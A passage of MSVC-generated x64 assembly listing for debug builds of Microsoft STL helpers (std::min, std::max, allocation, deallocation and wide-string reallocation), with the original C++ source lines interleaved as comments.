  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2203 : #if _HAS_CXX23
; 2204 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2205 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2206 :         _Count                  = _Allocated;
; 2207 :         return _Ptr;
; 2208 :     } else
; 2209 : #endif // _HAS_CXX23
; 2210 :     {
; 2211 :         return _Al.allocate(_Count);

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  0002b	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  0002e	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00035	e8 00 00 00 00	 call	 ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ; std::allocator<wchar_t>::allocate

; 2212 :     }
; 2213 : }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$min@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$min@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::min<unsigned __int64>, COMDAT

; 98   :     (min) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Right < _Left)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 99   :     // return smaller of _Left and _Right
; 100  :     return _Right < _Left ? _Right : _Left;

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0002b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@min
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@min
$LN3@min:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@min:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 101  : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$min@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::min<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Val$ = 224
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z PROC	; std::addressof<wchar_t *>, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__7C4A1519_type_traits
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1584 :     return __builtin_addressof(_Val);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Val$[rbp]

; 1585 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ENDP	; std::addressof<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
_TEXT	SEGMENT
$T1 = 200
_Obj$ = 256
<_Args_0>$ = 264
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * const &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__C27AFEEB_xutility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00024	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Obj$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ; std::addressof<wchar_t *>
  00030	48 8b d0	 mov	 rdx, rax
  00033	b9 08 00 00 00	 mov	 ecx, 8
  00038	e8 00 00 00 00	 call	 ??2@YAPEAX_KPEAX@Z	; operator new
  0003d	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00044	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]
  0004b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR <_Args_0>$[rbp]
  00052	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00055	48 89 08	 mov	 QWORD PTR [rax], rcx

; 256  :     }
; 257  : }

  00058	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005f	5f		 pop	 rdi
  00060	5d		 pop	 rbp
  00061	c3		 ret	 0
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
_TEXT	SEGMENT
_Fancy_ptr$ = 8
_Al$ = 256
_Capacity$ = 264
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>, COMDAT

; 2611 :     _NODISCARD static _CONSTEXPR20 pointer _Allocate_for_capacity(_Alty& _Al, size_type& _Capacity) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2612 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2613 :         ++_Capacity; // Take null terminator into consideration

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  0002b	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0002e	48 ff c0	 inc	 rax
  00031	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00038	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2614 : 
; 2615 :         pointer _Fancy_ptr;
; 2616 :         if constexpr (_Policy == _Allocation_policy::_At_least) {
; 2617 :             _Fancy_ptr = _Allocate_at_least_helper(_Al, _Capacity);

  0003b	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR _Capacity$[rbp]
  00042	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00049	e8 00 00 00 00	 call	 ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
  0004e	48 89 45 08	 mov	 QWORD PTR _Fancy_ptr$[rbp], rax

; 2618 :         } else {
; 2619 :             _STL_INTERNAL_STATIC_ASSERT(_Policy == _Allocation_policy::_Exactly);
; 2620 :             _Fancy_ptr = _Al.allocate(_Capacity);
; 2621 :         }
; 2622 : 
; 2623 : #if _HAS_CXX20
; 2624 :         // Start element lifetimes to avoid UB. This is a more general mechanism than _String_val::_Activate_SSO_buffer,
; 2625 :         // but likely more impactful to throughput.
; 2626 :         if (_STD is_constant_evaluated()) {
; 2627 :             _Elem* const _Ptr = _Unfancy(_Fancy_ptr);
; 2628 :             for (size_type _Idx = 0; _Idx < _Capacity; ++_Idx) {
; 2629 :                 _STD construct_at(_Ptr + _Idx);
; 2630 :             }
; 2631 :         }
; 2632 : #endif // _HAS_CXX20
; 2633 :         --_Capacity;

  00052	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  00059	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0005c	48 ff c8	 dec	 rax
  0005f	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00066	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2634 :         return _Fancy_ptr;

  00069	48 8b 45 08	 mov	 rax, QWORD PTR _Fancy_ptr$[rbp]

; 2635 :     }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
_TEXT	SEGMENT
_Ptr$ = 224
_Bytes$ = 232
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z PROC		; std::_Deallocate<16,0>, COMDAT

; 255  : _CONSTEXPR20 void _Deallocate(void* _Ptr, size_t _Bytes) noexcept {

$LN4:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 256  :     // deallocate storage allocated by _Allocate when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 257  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 258  :     if (_STD is_constant_evaluated()) {
; 259  :         ::operator delete(_Ptr);
; 260  :     } else
; 261  : #endif // _HAS_CXX20
; 262  :     {
; 263  : #if defined(_M_IX86) || defined(_M_X64)
; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00024	48 81 bd e8 00
	00 00 00 10 00
	00		 cmp	 QWORD PTR _Bytes$[rbp], 4096 ; 00001000H
  0002f	72 13		 jb	 SHORT $LN2@Deallocate

; 265  :             _Adjust_manually_vector_aligned(_Ptr, _Bytes);

  00031	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR _Bytes$[rbp]
  00038	48 8d 8d e0 00
	00 00		 lea	 rcx, QWORD PTR _Ptr$[rbp]
  0003f	e8 00 00 00 00	 call	 ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
$LN2@Deallocate:

; 266  :         }
; 267  : #endif // defined(_M_IX86) || defined(_M_X64)
; 268  :         ::operator delete(_Ptr, _Bytes);

  00044	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Bytes$[rbp]
  0004b	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00052	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete

; 269  :     }
; 270  : }

  00057	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005e	5f		 pop	 rdi
  0005f	5d		 pop	 rbp
  00060	c3		 ret	 0
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ENDP		; std::_Deallocate<16,0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$max@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$max@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::max<unsigned __int64>, COMDAT

; 75   :     (max) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Left < _Right)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 76   :     // return larger of _Left and _Right
; 77   :     return _Left < _Right ? _Right : _Left;

  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@max
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@max
$LN3@max:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@max:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 78   : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$max@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::max<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z
_TEXT	SEGMENT
_Obj$ = 224
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z PROC	; std::_Destroy_in_place<wchar_t *>, COMDAT

; 307  : _CONSTEXPR20 void _Destroy_in_place(_Ty& _Obj) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 308  :     if constexpr (is_array_v<_Ty>) {
; 309  :         _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 310  :     } else {
; 311  :         _Obj.~_Ty();
; 312  :     }
; 313  : }

  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ENDP	; std::_Destroy_in_place<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 224
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z PROC			; std::_Unfancy<wchar_t>, COMDAT

; 35   : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 36   :     return _Ptr;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]

; 37   : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ENDP			; std::_Unfancy<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
_TEXT	SEGMENT
_Old_capacity$ = 8
_New_capacity$ = 40
_Al$ = 72
_New_ptr$ = 104
__$ArrayPad$ = 312
this$ = 352
_New_size$ = 360
_Fn$ = 368
<_Args_0>$ = 376
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>, COMDAT

; 4778 :     _CONSTEXPR20 basic_string& _Reallocate_for(const size_type _New_size, _Fty _Fn, _ArgTys... _Args) {

$LN6:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 88 44 24 18	 mov	 BYTE PTR [rsp+24], r8b
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 68 01
	00 00		 sub	 rsp, 360		; 00000168H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00027	b9 22 00 00 00	 mov	 ecx, 34			; 00000022H
  0002c	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00031	f3 ab		 rep stosd
  00033	48 8b 8c 24 88
	01 00 00	 mov	 rcx, QWORD PTR [rsp+392]
  0003b	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00042	48 33 c5	 xor	 rax, rbp
  00045	48 89 85 38 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0004c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00053	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4779 :         // reallocate to store exactly _New_size elements, new buffer prepared by
; 4780 :         // _Fn(_New_ptr, _New_size, _Args...)
; 4781 :         if (_New_size > max_size()) {

  00058	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0005f	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00064	48 39 85 68 01
	00 00		 cmp	 QWORD PTR _New_size$[rbp], rax
  0006b	76 05		 jbe	 SHORT $LN2@Reallocate

; 4782 :             _Xlen_string(); // result too long

  0006d	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4783 :         }
; 4784 : 
; 4785 :         const size_type _Old_capacity = _Mypair._Myval2._Myres;

  00072	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00079	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  0007d	48 89 45 08	 mov	 QWORD PTR _Old_capacity$[rbp], rax

; 4786 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  00081	48 8b 95 68 01
	00 00		 mov	 rdx, QWORD PTR _New_size$[rbp]
  00088	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0008f	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00094	48 89 45 28	 mov	 QWORD PTR _New_capacity$[rbp], rax

; 4787 :         auto& _Al                     = _Getal();

  00098	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009f	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  000a4	48 89 45 48	 mov	 QWORD PTR _Al$[rbp], rax

; 4788 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  000a8	48 8d 55 28	 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  000ac	48 8b 4d 48	 mov	 rcx, QWORD PTR _Al$[rbp]
  000b0	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  000b5	48 89 45 68	 mov	 QWORD PTR _New_ptr$[rbp], rax

; 4789 : 
; 4790 :         _Mypair._Myval2._Orphan_all();

  000b9	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000c0	48 8b c8	 mov	 rcx, rax
  000c3	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4791 :         _ASAN_STRING_REMOVE(*this);
; 4792 :         _Mypair._Myval2._Mysize = _New_size;

  000c8	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000cf	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _New_size$[rbp]
  000d6	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 4793 :         _Mypair._Myval2._Myres  = _New_capacity;

  000da	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000e1	48 8b 4d 28	 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  000e5	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 4794 :         _Fn(_Unfancy(_New_ptr), _New_size, _Args...);

  000e9	48 8b 4d 68	 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  000ed	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  000f2	4c 8b 8d 78 01
	00 00		 mov	 r9, QWORD PTR <_Args_0>$[rbp]
  000f9	4c 8b 85 68 01
	00 00		 mov	 r8, QWORD PTR _New_size$[rbp]
  00100	48 8b d0	 mov	 rdx, rax
  00103	48 8d 8d 70 01
	00 00		 lea	 rcx, QWORD PTR _Fn$[rbp]
  0010a	e8 00 00 00 00	 call	 ??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()

; 4795 :         if (_Old_capacity > _Small_string_capacity) {

  0010f	48 83 7d 08 07	 cmp	 QWORD PTR _Old_capacity$[rbp], 7
  00114	76 27		 jbe	 SHORT $LN3@Reallocate

; 4796 :             _Deallocate_for_capacity(_Al, _Mypair._Myval2._Bx._Ptr, _Old_capacity);

  00116	4c 8b 45 08	 mov	 r8, QWORD PTR _Old_capacity$[rbp]
  0011a	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00121	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  00124	48 8b 4d 48	 mov	 rcx, QWORD PTR _Al$[rbp]
